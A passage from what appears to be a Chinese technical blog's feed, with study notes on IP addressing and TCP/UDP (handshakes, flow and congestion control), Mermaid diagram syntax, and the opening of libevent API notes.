个。</li><li>4.D类地址（ 224.0.0.0 - 239.255.255.255 ）为组播地址，使用”1110”开头，不分网络段和主机段，有 2^28 个组播地址。用于标识预先定义的一组主机。主机使用组播通信时，可以将组播数据报一次性发送给所有同组的主机。</li><li>5.E类地址（ 240.0.0.0 - 255.255.255.255 ）是保留地址，用于研究使用。以”1111”开头，不区分网络段和主机段，其中32位全1代表本网络内广播，因此E类地址共有 2^28-1 个。</li></ul><p>ip地址又有私有ip地址(主要为了解决ip地址不够用的问题)和特殊ip地址</p><p><strong>私有IP地址</strong></p><p>A类私有ip地址(10.0.0.0&#x2F;8)</p><p>B类私有ip地址(172.16.0.0&#x2F;12)</p><p>C类私有ip地址(192.168.0.0&#x2F;16)</p><p><strong>特殊ip地址</strong></p><p>127.0.0.0&#x2F;8,本地回环地址,用于表示本机,常用于测试</p><p>169.254.0.0&#x2F;16,主要用于DHCP服务器出问题时本地局域网计算机可以继续进行通讯</p><h4 id="6-TCP-UDP协议"><a href="#6-TCP-UDP协议" class="headerlink" title="6.TCP&#x2F;UDP协议"></a>6.TCP&#x2F;UDP协议</h4><h5 id="1-TCP协议"><a href="#1-TCP协议" class="headerlink" title="1.TCP协议"></a>1.TCP协议</h5><p><strong>传输控制协议</strong>（英语：<strong>T</strong>ransmission <strong>C</strong>ontrol <strong>P</strong>rotocol，缩写：<strong>TCP</strong>）是一种面向连接的、可靠的、基于<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AF%80%E6%B5%81">字节流</a>的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82">传输层</a>通信协议，由<a href="https://zh.wikipedia.org/wiki/IETF">IETF</a>的<a href="https://zh.wikipedia.org/wiki/RFC">RFC</a> <a href="https://tools.ietf.org/html/rfc793">793</a>定义。在简化的计算机网络<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">OSI模型</a>中，它完成第四层传输层所指定的功能。</p><p>TCP包头(20byte~60byte)</p><ul><li><p>1.源端口(16bit)</p><p>发送端的端口号</p></li><li><p>2.目的端口(16bit)</p><p>目标端的端口号</p></li><li><p>3.序号(32bit)</p><p>顺序号，4个字节，用来标识从 TCP 源端向 TCP 目的端发送的数据字节流，它表示在这个报文段中的第一个数据字节的顺序号。如果将字节流看作在两个应用程序间的单向流动，则 TCP 用顺序号对每个字节进行计数。序号是 32bit 的无符号数，<strong>序号到达 (2^32) － 1 后又从 0 开始。</strong>当建立一个新的连接时， SYN 标志变 1 ，顺序号字段包含由这个主机选择的该连接的初始顺序号 ISN （ Initial Sequence Number ）</p></li><li><p>4.确认号(32bit)</p><p>确认号，4个字节，包含发送确认的一端所期望收到的下一个顺序号。因此，确认序号应当是上次已成功收到数据字节顺序号加 1 。只有 ACK 标志为 1 时确认序号字段才有效</p></li><li><p>5.数据偏移量(4bit)</p><p>包头长度(单位为4字节)</p></li><li><p>6.保留位(6bit)</p><p>保留区域，6位，保留给将来使用，目前必须置为 0</p></li><li><p>7.控制位(6bit)</p><p>URG,为1表示紧急指针值有效,反之无效</p><p>ACK,为1表示确认号有效</p><p>PSH,为1表示带有PUSH标志的数据,指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满。</p><p>RST,用于复位,表示出现了主机崩溃或者错误连接</p><p>SYN,同步序号,为1表示连接请求,用于建立连接和使顺序号同步</p><p>FIN,用于释放连接</p></li><li><p>8.窗口大小(16bit)</p><p>窗口大小，2个字节，表示从确认号开始，本报文的源方可以接收的字节数，即源方接收窗口大小。窗口大小是一个 16bit 字段，因而窗口大小最大为 65535（2^16 - 1）</p></li><li><p>9.校验和(16bit)</p><p>校验和，2个字节，对整个的 TCP 报文段<strong>（包括 TCP 头部和 TCP 数据）</strong>，以 16 位字进行计算所得。这是一个强制性的字段，要求由发送端计算和存储，并由接收端进行验证</p></li><li><p>10.紧急指针(16bit)</p><p>紧急指针，2个字节，是一个正的偏移量，和顺序号字段中的值相加表示紧急数据最后一个字节的序号。 TCP 的紧急方式是发送端向另一端发送紧急数据的一种方式。 只有当URG 标志置 1 时紧急指针才有效</p></li><li><p>11.可选项</p></li></ul><p><strong>TCP三次握手</strong>(重点)</p><p>1.Client将tcp中标志位SYN置为1,并初始化一个序列号x,用于客户端到服务端的会话,发送给服务端请求连接,此时客户端进入SYN_SEND状态</p><p>2.Server收到Client发来的请求连接报文后,会将ACK置为1,并将ack置为x+1,并初始化一个序列号y,用于以后服务端到客户端的会话表示接受连接(客户端到服务端),并将SYN置为1请求和客户端连接(服务端到客户端),此时Server进入SYN_RECV状态</p><p>3.Client收到报文后,客户端到服务端完成连接(Client进入到ESTABLISHED状态),并将ACK置为1表示接受连接(服务端到客户端),服务端收到后,服务端到客户端也完成连接,3次握手完成,此时Client和Server都进入ESTABLISHED状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line"> Client-&gt;&gt;+Server:SYN=1,seq=x</span><br><span class="line"> Server-&gt;&gt;+Client:SYN=1,seq=y,ack=x+1,ACK=1</span><br><span class="line"> Client-&gt;&gt;+Server:ACK=1,ack=y+1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>TCP四次挥手</strong>（重点)</p><p>Client或Server均可发起断开连接,这里以客户端发起释放连接为例</p><p>1.Client将标志位FIN置为1,并将序列号seq&#x3D;u(假设此时序列号为u)发送给Server,此时Client进入FIN_WAIT-1状态</p><p>2.Server收到报文后,将ACK标志位置为1,将ack置为u+1发送给Client,表示Server已经接受到Client发来的断开连接请求,Client收到该报文后会进入FIN_WAIT-2状态,此时TCP进入到半连接状态,Client到Server的连接释放,此时Server进入CLOSE-WAIT,此时Server将剩下要发完的数据依次全部发送给Client</p><p>3.Server将剩余要发送完的数据发送完成后,将FIN标志为置为1,ACK置为1,发送给Client,表示释放连接(服务端到客户端),</p><p>4.Client收到该报文后,将标志位ACK置为1,表示接受释放连接,此时Server到客户端的连接释放,TCP4次挥手完成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">Client-&gt;&gt;+Server:FIN=1,seq=u</span><br><span class="line">Server-&gt;&gt;+Client:ACK=1,ack=u+1,seq=v</span><br><span class="line">Server--&gt;&gt;+Client:DATA</span><br><span class="line">Server-&gt;&gt;+Client:FIN=1,ACK=1,seq=w,ack=u+1</span><br><span class="line">Client-&gt;&gt;+Server:ACK=1,ack=w+1,seq=u+1</span><br></pre></td></tr></table></figure><p><strong>tcp窗口控制和重发机制</strong></p><p><strong>首先，先考虑ACK未能发送到发送端主机的情况，在窗口一定程度较大时，即使有少部分的确认应答丢失也不会进行数据重发，因为可以通过下一个ACK进行确认</strong></p><p>比如说，你发送1-100，101-200,201-300三个数据段，但是接收端主机的3个对应ACK前两个丢失了，只有201-300的到达，这将会刷新接收端的序列号从而不影响数据传输</p><p><strong>高速重发控制</strong></p><p>如果接收端接收到一个自己一个接收的序号以外的数据时，会针对当前为止收到的数据返回ACK数据包,如果接收端连续三次接受到了三个确认号一样的tcp报文,则表明有数据包丢失了,则进入重发机制,这个过程中几乎不会影响数据交互<strong>（因为即使接收端主机收到的序列号并不连续，也不会将数据丢弃而是暂时保存至缓冲区）</strong>,这种机制比超时重发机制更有效,因此也称为高速重发机制。</p><p><strong>流量控制</strong></p><p>在tcp包头中有一个字段专门用来表明当前主机的窗口大小(即发送端主机不需要接收端发来的确认包就可以发送的最大字节数),这个字段一般会根据实时的网络情况进行自动调整,这个字段越大表明网络吞吐量更大,如果接收端缓冲区面临数据溢出时,窗口大小就会变为一个更小的值,如果，<strong>数据溢出</strong>，但是<strong>过了</strong>发送端的<strong>重发超时时间</strong>还未收到窗口更新的通知，发送端将会发送一个窗口探测的包</p><p><strong>拥塞控制</strong></p><p>有了TCP的窗口控制，收发主机之间不再以一个数据段为单位发送ACK，也能连续发送大量数据包</p><p>计算机网络都处于一个共享的环境。因此也有可能会因为其他主机之间的通信使网络变得拥堵，在网络出现拥堵的时候，如果发送一个较大量的数据，极有可能导致整个网络瘫痪</p><p>因此，TCP在通信一开始的时候会通过一个叫做<strong>慢启动</strong>的算法得出的数值，对收发数据量进行控制</p><p>首先，为了在发送端调节所要发送数据的量，定义了一个叫做“<strong>拥塞窗口</strong>”的概念。于是在慢启动的时候，将这个拥塞窗口的大小设置为1个数据段（1MSS），之后每收到,1次ACK，拥塞窗口的值就加1，在发送数据时，将拥塞窗口的大小与接收端主机通知的窗口大小进行比较，选择较小的值，并且发送比其还要小的数据量</p><p>随着包的每次往返，拥塞窗口也会以1、2、4等指数函数的增长，拥堵状况剧烈还是可能导致网络拥塞的发生。为了防止这些，引入了<strong>慢启动阀值</strong>的概念，只要拥塞窗口的值超出了这个阀值，在每一次收到ACK时，只允许以一种相对缓慢的方式放大拥塞窗口<strong>（MSS字节数*MSS字节数&#x2F;拥塞窗口大小）</strong></p><p>TCP的通信开始时，并没有设置相应的<strong>慢启动阀值</strong>。而是在超时重发时，才会设置为当时拥塞窗口一半的大小</p><p>当重复ACK而触发高速重发时，<strong>慢启动阀值</strong>会设置为当时<strong>窗口大小（实际已发送但未收到ACK的数据量）</strong>一半的大小<strong>（而当时窗口大小会重置为慢启动阀值+3MSS）</strong></p><p><strong>TCP拥塞控制算法</strong></p><p>因为实际的网络环境是瞬息万变的,因此并没有那个算法适用与任何场景,因此在实际的生产环境下应该要对实际的需求和网络环境配置其合适的tcp拥塞控制算法,以达到最佳效果。传统的tcp拥塞控制算法分为以下两类</p><ul><li>基于丢包策略的传统拥塞控制算法</li></ul><p><img src="/images/tcp-1.jpg" alt="基于丢包策略的传统拥塞控制算法"></p><ul><li>基于延时策略的传统拥塞控制算法</li></ul><p><img src="/images/tcp-2.jpg" alt="基于延时策略的传统拥塞控制算法"></p><p><strong>TCP建立连接为什么要三次握手?</strong></p><p>三次握手的目的是建立可靠的通信信道,而可靠的通信信道最基础的就是发送者和接受者发送接受都正常,即三次握手最主要的目的就是确认客户端和服务端发送和接受都是正常的,</p><p>第一次握手,客户端发送出建立连接报文后,自己什么都确认不了,但是服务端一旦接受到客户端发来的申请建立连接报文后,就可以确认客户端发送正常,自己接受正常</p><p>第二次握手,服务端发送确认建立连接报文后,客户端一旦接受到了就可以确认,客户端可以确认自己发送接受正常,对方发送和接受都正常</p><p>第三次握手,客户端发送出确认连接报文后,服务端一旦接收到,就可以确认自己发送接受正常,对方发送和接受都正常,</p><p>至此,客户端和服务端都能确认对方和自己发送和接收数据都是正常的。</p><p><strong>TCP断开连接为什么要进行四次挥手？</strong></p><p>TCP断开连接过程中的四次挥手主要就是为了双方都能确认对方都没有数据发送了。</p><p>由于 TCP 的<strong>半关闭</strong>（half-close）特性，TCP 提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。</p><p>任何一方都可以在数据传送结束后发出连接释放的通知，待对方确认后进入<strong>半关闭状态</strong>。当另一方也没有数据再发送的时候，则发出连接释放通知，对方确认后就<strong>完全关闭</strong>了TCP连接。</p><p>通俗的来说，两次握手就可以释放一端到另一端的 TCP 连接，完全释放连接一共需要四次握手</p><p><strong>tcp三次握手可以携带数据吗?</strong></p><p>第三次握手的时候，是可以携带数据的。但是，第一次、第二次握手绝对不可以携带数据。</p><p>假如第一次握手可以携带数据的话，如果有人要恶意攻击服务器，那他每次都在第一次握手中的 SYN 报文中放入大量的数据，然后疯狂重复发 SYN 报文的话，这会让服务器花费很多时间、内存空间来接收这些报文。</p><p><strong>为什么第二次挥手完成之后客户端到服务端的连接已经释放了,第四次挥手仍然能够发送ACK报文给服务端？</strong></p><p>客户端到服务端连接释放后,只是服务端不在接受来自客户端发送报文的应用数据,而ACK是放在TCP头中的,因此这和客户端到服务端连接释放,但是客户端仍然能够发送ACK报文给服务端并不冲突</p><p><strong>为什么不能用两次握手进行连接？</strong></p><p>答：3次握手完成两个重要的功能，既要双方做好发送数据的准备工作(双方都知道彼此已准备好)，也要允许双方就初始序列号进行协商，这个序列号在握手过程中被发送和确认。现在把三次握手改成仅需要两次握手，死锁是可能发生的。作为例子，考虑计算机S和C之间的通信，假定C给S发送一个连接请求分组，S收到了这个分组，并发送了确认应答分组。按照两次握手的协定，S认为连接已经成功地建立了，可以开始发送数据分组。可是，C在S的应答分组在传输中被丢失的情况下，将不知道S是否已准备好，不知道S建立什么样的序列号，C甚至怀疑S是否收到自己的连接请求分组。在这种情况下，C认为连接还未建立成功，将忽略S发来的任何数据分组，只等待连接确认应答分组。而S在发出的分组超时后，重复发送同样的分组。这样就形成了死锁。</p><p><strong>如果已经建立了连接，但是客户端突然出现故障了怎么办？</strong></p><p>TCP还设有一个保活计时器，显然，客户端如果出现故障，服务器不能一直等下去，白白浪费资源。服务器每收到一次客户端的请求后都会重新复位这个计时器，时间通常是设置为2小时，若两小时还没有收到客户端的任何数据，服务器就会发送一个探测报文段，以后每隔75分钟发送一次。若一连发送10个探测报文仍然没反应，服务器就认为客户端出了故障，接着就关闭连接。</p><p><strong>为什么TCP客户端最后还要发送一次确认呢？</strong></p><p>一句话，主要防止已经失效的连接请求报文突然又传送到了服务器，从而产生错误。如果使用的是两次握手建立连接，假设有这样一种场景，客户端发送了第一个请求连接并且没有丢失，只是因为在网络结点中滞留的时间太长了，由于TCP的客户端迟迟没有收到确认报文，以为服务器没有收到，此时重新向服务器发送这条报文，此后客户端和服务器经过两次握手完成连接，传输数据，然后关闭连接。此时此前滞留的那一次请求连接，网络通畅了到达了服务器，这个报文本该是失效的，但是，两次握手的机制将会让客户端和服务器再次建立连接，这将导致不必要的错误和资源的浪费。如果采用的是三次握手，就算是那一次失效的报文传送过来了，服务端接受到了那条失效报文并且回复了确认报文，但是客户端不会再次发出确认。由于服务器收不到确认，就知道客户端并没有请求连接。</p><h5 id="2-UDP协议"><a href="#2-UDP协议" class="headerlink" title="2.UDP协议"></a>2.UDP协议</h5><p>UDP（UserDatagramProtocol）是一个简单的面向消息的传输层协议，尽管UDP提供标头和有效负载的完整性验证（通过校验和），但它不保证向上层协议提供消息传递，并且UDP层在发送后不会保留UDP 消息的状态。因此，UDP有时被称为不可靠的数据报协议。如果需要传输可靠性，则必须在用户应用程序中实现。</p><p>UDP使用具有最小协议机制的简单无连接通信模型。UDP提供数据完整性的校验和，以及用于在数据报的源和目标寻址不同函数的端口号。它没有握手对话，因此将用户的程序暴露在底层网络的任何不可靠的方面。如果在网络接口级别需要纠错功能，应用程序可以使用为此目的设计的传输控制协议（TCP）。</p><p>UDP包头</p><ul><li><p>1.源端口号(16bit)</p><p>发送端的端口号</p></li><li><p>2.目标端口号(16bit)</p><p>目的端的端口号</p></li><li><p>3.总长度(16bit)</p><p>数据包的总长度</p></li><li><p>4.校验和(16bit)</p><p>数据包的校验和</p></li></ul><p><strong>UDP的特点</strong></p><p>1.UDP是无连接的，即发送数据之前不需要建立连接，因此减少了开销和发送数据之前的时延。</p><p>2.UDP使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的连接状态表。</p><p>3.UDP是面向报文的。发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付IP层。UDP对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。因此，应用程序必须选择合适大小的报文。</p><p>4.UDP没有拥塞控制，因此网络出现的拥塞不会使源主机的发送速率降低。很多的实时应用（如IP电话、实时视频会议等）要去源主机以恒定的速率发送数据，并且允许在网络发生拥塞时丢失一些数据，但却不允许数据有太多的时延。UDP正好符合这种要求。</p><p>5.UDP支持一对一、一对多、多对一和多对多的交互通信。</p><p>6.UDP的首部开销小，只有8个字节，比TCP的20个字节的首部要短。</p><p>参考:</p><p>维基百科</p><p><a href="https://segmentfault.com/a/1190000039165592">https://segmentfault.com/a/1190000039165592</a></p><p><a href="https://zhuanlan.zhihu.com/p/53374516">https://zhuanlan.zhihu.com/p/53374516</a></p><p><a href="https://blog.csdn.net/qq_30549833/article/details/60139328">https://blog.csdn.net/qq_30549833/article/details/60139328</a></p><p><a href="https://blog.51cto.com/u_13854765/2163296">https://blog.51cto.com/u_13854765/2163296</a></p><p><a href="https://blog.csdn.net/why_still_confused/article/details/51658930">https://blog.csdn.net/why_still_confused/article/details/51658930</a></p><p><a href="https://zhuanlan.zhihu.com/p/37836445">https://zhuanlan.zhihu.com/p/37836445</a></p><p><a href="https://www.51cto.com/article/685201.html">https://www.51cto.com/article/685201.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown画流程图</title>
      <link href="/2022/04/18/markdown%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/"/>
      <url>/2022/04/18/markdown%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="markdown画流程图"><a href="#markdown画流程图" class="headerlink" title="markdown画流程图"></a>markdown画流程图</h1><h4 id="1-mermaid"><a href="#1-mermaid" class="headerlink" title="1.mermaid"></a>1.mermaid</h4><p>mermaid是一种类似于markdown的脚本语言,通过javascript语言将文本转化为图片</p><h5 id="1-流程图"><a href="#1-流程图" class="headerlink" title="1.流程图"></a>1.流程图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    A--&gt;B;</span><br><span class="line">    A--&gt;C;</span><br><span class="line">    B--&gt;D;</span><br></pre></td></tr></table></figure><p>实际效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    A--&gt;B;</span><br><span class="line">    A--&gt;C;</span><br><span class="line">    B--&gt;D;</span><br></pre></td></tr></table></figure><h5 id="2-时序图"><a href="#2-时序图" class="headerlink" title="2.时序图"></a>2.时序图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    Alice-&gt;&gt;John: Hello John, how are you?</span><br><span class="line">    John--&gt;&gt;Alice: Great!</span><br></pre></td></tr></table></figure><p>实际效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    Alice-&gt;&gt;John: Hello John, how are you?</span><br><span class="line">    John--&gt;&gt;Alice: Great!</span><br></pre></td></tr></table></figure><h5 id="3-状态图"><a href="#3-状态图" class="headerlink" title="3.状态图"></a>3.状态图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stateDiagram</span><br><span class="line">    [*] --&gt; s1</span><br><span class="line">    s1 --&gt; [*]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stateDiagram</span><br><span class="line">    [*] --&gt; s1</span><br><span class="line">    s1 --&gt; [*]</span><br></pre></td></tr></table></figure><h5 id="4-类图"><a href="#4-类图" class="headerlink" title="4.类图"></a>4.类图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">classDiagram</span><br><span class="line">      Animal &lt;|-- Duck</span><br><span class="line">      Animal &lt;|-- Fish</span><br><span class="line">      Animal &lt;|-- Zebra</span><br><span class="line">      Animal : +int age</span><br><span class="line">      Animal : +String gender</span><br><span class="line">      Animal: +isMammal()</span><br><span class="line">      Animal: +mate()</span><br><span class="line">      class Duck&#123;</span><br><span class="line">          +String beakColor</span><br><span class="line">          +swim()</span><br><span class="line">          +quack()</span><br><span class="line">      &#125;</span><br><span class="line">      class Fish&#123;</span><br><span class="line">          -int sizeInFeet</span><br><span class="line">          -canEat()</span><br><span class="line">      &#125;</span><br><span class="line">      class Zebra&#123;</span><br><span class="line">          +bool is_wild</span><br><span class="line">          +run()</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">classDiagram</span><br><span class="line">      Animal &lt;|-- Duck</span><br><span class="line">      Animal &lt;|-- Fish</span><br><span class="line">      Animal &lt;|-- Zebra</span><br><span class="line">      Animal : +int age</span><br><span class="line">      Animal : +String gender</span><br><span class="line">      Animal: +isMammal()</span><br><span class="line">      Animal: +mate()</span><br><span class="line">      class Duck&#123;</span><br><span class="line">          +String beakColor</span><br><span class="line">          +swim()</span><br><span class="line">          +quack()</span><br><span class="line">      &#125;</span><br><span class="line">      class Fish&#123;</span><br><span class="line">          -int sizeInFeet</span><br><span class="line">          -canEat()</span><br><span class="line">      &#125;</span><br><span class="line">      class Zebra&#123;</span><br><span class="line">          +bool is_wild</span><br><span class="line">          +run()</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h4 id="5-饼图"><a href="#5-饼图" class="headerlink" title="5.饼图"></a>5.饼图</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pie</span><br><span class="line">    title Key elements <span class="keyword">in</span> Product X</span><br><span class="line">    <span class="string">&quot;Calcium&quot;</span> : 42.96</span><br><span class="line">    <span class="string">&quot;Potassium&quot;</span> : 50.05</span><br><span class="line">    <span class="string">&quot;Magnesium&quot;</span> : 10.01</span><br><span class="line">    <span class="string">&quot;Iron&quot;</span> :  5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pie</span><br><span class="line">    title Key elements in Product X</span><br><span class="line">    &quot;Calcium&quot; : 42.96</span><br><span class="line">    &quot;Potassium&quot; : 50.05</span><br><span class="line">    &quot;Magnesium&quot; : 10.01</span><br><span class="line">    &quot;Iron&quot; :  5</span><br></pre></td></tr></table></figure><p>参考于:<a href="https://zhuanlan.zhihu.com/p/355997933">https://zhuanlan.zhihu.com/p/355997933</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件配置和使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基本软件的使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libevent学习笔记</title>
      <link href="/2022/04/17/libevent%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/17/libevent%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="libevent学习笔记"><a href="#libevent学习笔记" class="headerlink" title="libevent学习笔记"></a>libevent学习笔记</h1><h4 id="1-什么是libevent"><a href="#1-什么是libevent" class="headerlink" title="1.什么是libevent?"></a>1.什么是libevent?</h4><p>Libevent 是一个用C语言编写的、轻量级的开源高性能事件通知库，主要有以下几个亮点：事件驱动（ event-driven），高性能;轻量级，专注于网络，不如 ACE 那么臃肿庞大；源代码相当精炼、易读；跨平台，支持 Windows、 Linux、 *BSD 和 Mac Os；支持多种 I&#x2F;O 多路复用技术， epoll、 poll、 dev&#x2F;poll、 select 和 kqueue 等；支持 I&#x2F;O，定时器和信号等事件；注册事件优先级。</p><h4 id="2-基本数据类型"><a href="#2-基本数据类型" class="headerlink" title="2.基本数据类型"></a>2.基本数据类型</h4><h6 id="1-event-base"><a href="#1-event-base" class="headerlink" title="1.event_base"></a>1.event_base</h6><p>一个监听对象,一般libevent为了监听多个文件描述符只需要将多个事件绑定到event_base对象即可</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> event_base *<span class="title function_">event_base_new</span><span class="params">()</span>;<span class="comment">//创建一个event_base</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">event_base_free</span><span class="params">(<span class="keyword">struct</span> event_base *base)</span>;<span class="comment">//释放一个event_base</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_base_priority_init</span><span class="params">(<span class="keyword">struct</span> event_base *base, <span class="type">int</span> n_priorities)</span>;<span class="comment">//为事件设置优先级,以后事件优先级可以从0到n_priorities,(0最高)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_reinit</span><span class="params">(<span class="keyword">struct</span> event_base *base)</span>;<span class="comment">//调用fork函数之后要重新初始化base,因此要使用此函数重新初始化</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_base_loop</span><span class="params">(<span class="keyword">struct</span> event_base *base, <span class="type">int</span> flags)</span>;<span class="comment">//开始运行循环</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_base_dispatch</span><span class="params">(<span class="keyword">struct</span> event_base *base)</span>;<span class="comment">//同event_base_loop,只是flag没有设置</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_base_loopexit</span><span class="params">(<span class="keyword">struct</span> event_base *base,<span class="type">const</span> <span class="keyword">struct</span> timeval *tv)</span>;<span class="comment">//让event_base在指定的时间之后停止循环</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_base_loopbreak</span><span class="params">(<span class="keyword">struct</span> event_base *base)</span>;<span class="comment">//让event_base立即停止循环</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">event_base_dump_events</span><span class="params">(<span class="keyword">struct</span> event_base *base, FILE *f)</span>;<span class="comment">//将event_base的状态转存到文件中</span></span><br></pre></td></tr></table></figure><h6 id="2-event"><a href="#2-event" class="headerlink" title="2.event"></a>2.event</h6><p>一个事件,libevent监听的最小单位</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EV_TIMEOUT      0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EV_READ         0x02</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EV_WRITE        0x04</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EV_SIGNAL       0x08</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EV_PERSIST      0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EV_ET           0x20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*event_callback_fn)</span><span class="params">(<span class="type">evutil_socket_t</span>, <span class="type">short</span>, <span class="type">void</span> *)</span>;<span class="comment">//触发事件调用的回调函数类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> event *<span class="title function_">event_new</span><span class="params">(<span class="keyword">struct</span> event_base *base, <span class="type">evutil_socket_t</span> fd,</span></span><br><span class="line"><span class="params">    <span class="type">short</span> what, event_callback_fn cb,</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *arg)</span>;<span class="comment">//创建一个新的event</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">event_free</span><span class="params">(<span class="keyword">struct</span> event *event)</span>;<span class="comment">//释放一个新的event</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_priority_set</span><span class="params">(<span class="keyword">struct</span> event *event, <span class="type">int</span> priority)</span>;</span><br></pre></td></tr></table></figure><h6 id="3-bufferevent"><a href="#3-bufferevent" class="headerlink" title="3.bufferevent"></a>3.bufferevent</h6><p>缓冲区监听事件,libevent常用bufferevent管理socket缓冲区的读写</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 